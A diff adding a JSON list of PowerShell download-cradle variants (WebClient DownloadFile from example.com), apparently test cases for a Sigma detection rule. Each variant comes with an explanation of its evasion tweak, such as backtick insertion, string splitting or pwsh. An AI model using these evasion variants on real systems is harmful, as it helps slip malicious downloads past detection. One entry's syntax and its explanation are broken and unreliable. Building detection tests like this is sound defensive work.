@@ -1,0 +1,34 @@
+[
+  {
+    "output": "powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\\test.txt')\"",
+    "explanation": "This command uses standard PowerShell syntax to invoke DownloadFile without any obfuscation or bypass techniques, making it a direct match for the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\\test.txt')\"",
+    "explanation": "This command uses the shortened namespace 'Net' instead of 'System.Net', which is a valid substitution and still matches the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object System.Net.Web`Client).DownloadFile('http://example.com/test.txt', 'C:\\test.txt')\"",
+    "explanation": "This command uses an escape character (`) to split 'WebClient' into 'Web`Client', which is a valid insertion and still matches the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object System.N'et.WebClient').DownloadFile('http://example.com/test.txt', 'C:\\test.txt')\"",
+    "explanation": "This command uses string concatenation to split 'Net' into 'N' + 'et', which is a valid recoding technique and still matches the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', '$env:TEMP\\test.txt')\"",
+    "explanation": "This command uses an environment variable ($env:TEMP) instead of a hard-coded path, which is a valid recoding technique and still matches the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\\t'+'est.txt')\"",
+    "explanation": "This command uses string concatenation to split the filename into 'test.txt', which is a valid substitution and still matches the rule."
+  },
+  {
+    "output": "pwsh.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\\test.txt')\"",
+    "explanation": "This command uses PowerShell Core (pwsh) instead of PowerShell, which is a valid substitution and still matches the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://example.com/test.txt', 'C:\\test.txt')\"",
+    "explanation": "This command uses a variable to store the WebClient object, which is a valid reordering and still matches the rule."
+  }
+]
